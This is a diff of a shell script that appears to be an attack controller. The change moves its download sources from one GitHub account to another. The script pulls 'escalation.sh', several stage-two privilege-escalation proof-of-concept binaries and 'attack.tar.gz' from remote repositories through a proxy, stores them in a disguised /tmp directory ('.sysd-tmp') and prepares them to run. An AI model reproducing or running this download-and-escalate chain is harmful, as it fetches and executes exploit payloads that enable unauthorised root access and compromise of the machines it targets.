@@ -8,18 +8,18 @@ TMPDIR_BASE="/tmp/.sysd-tmp"
 
 # escalation.sh 固定放在 /tmp 下
 ESCALATION_SH="/tmp/escalation.sh"
-ESCALATION_URL="https://gh-proxy.org/https://raw.githubusercontent.com/Jerryy959/controller/refs/heads/main/escalation.sh"
+ESCALATION_URL="https://gh-proxy.org/https://raw.githubusercontent.com/amjac27/controller/refs/heads/main/escalation.sh"
 
 touch /tmp/controller_maked_test_01122110
 
 # ==================== Stage2 URL 映射表 ====================
 declare -A STAGE2_URL_MAP=(
-    ["org"]="https://gh-proxy.org/https://raw.githubusercontent.com/Jerryy959/controller/refs/heads/main/poc/poc-oe-original"
-    ["haoc"]="https://gh-proxy.org/https://raw.githubusercontent.com/Jerryy959/controller/refs/heads/main/poc/poc-oe-haoc"
-    ["ubuntu"]="https://gh-proxy.org/https://raw.githubusercontent.com/Jerryy959/controller/refs/heads/main/poc/poc-oe-ubuntu"
-    ["test"]="https://github.com/Jerryy959/controller/releases/download/v1/escalation-db.elf" # 仅占位，实际不使用
+    ["org"]="https://gh-proxy.org/https://raw.githubusercontent.com/amjac27/controller/refs/heads/main/poc/poc-oe-original"
+    ["haoc"]="https://gh-proxy.org/https://raw.githubusercontent.com/amjac27/controller/refs/heads/main/poc/poc-oe-haoc"
+    ["ubuntu"]="https://gh-proxy.org/https://raw.githubusercontent.com/amjac27/controller/refs/heads/main/poc/poc-oe-ubuntu"
+    ["test"]="https://github.com/amjac27/controller/releases/download/v1/escalation-db.elf" # 仅占位，实际不使用
 )
-DEFAULT_STAGE2="https://gh-proxy.org/https://raw.githubusercontent.com/Jerryy959/controller/refs/heads/main/attack.tar.gz"
+DEFAULT_STAGE2="https://gh-proxy.org/https://raw.githubusercontent.com/amjac27/controller/refs/heads/main/attack.tar.gz"
 
 # ==================== 日志函数 ====================
 log() {
@@ -59,7 +59,7 @@ else
 fi
 
 # ==================== Stage1 URL（固定） ====================
-STAGE1_URL="https://gh-proxy.org/https://raw.githubusercontent.com/Jerryy959/controller/refs/heads/main/poc/poc-oe-original"
+STAGE1_URL="https://gh-proxy.org/https://raw.githubusercontent.com/amjac27/controller/refs/heads/main/poc/poc-oe-original"
 
 # ==================== 准备临时目录 ====================
 RAND_SUFFIX=$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')
@@ -124,7 +124,7 @@ while [ $attempt -le $MAX_RETRIES ]; do
     log_info "准备下载 attack.tar.gz 到 /tmp"
 
     if ! wget -q --no-cache --tries=3 --timeout=15 \
-        "https://gh-proxy.org/https://raw.githubusercontent.com/Jerryy959/controller/refs/heads/main/attack.tar.gz" \
+        "https://gh-proxy.org/https://raw.githubusercontent.com/amjac27/controller/refs/heads/main/attack.tar.gz" \
         -O "/tmp/attack.tar.gz"; then
         log_error "下载 attack.tar.gz 失败"
         # 可选：exit 1   # 如果失败就退出，看你需求
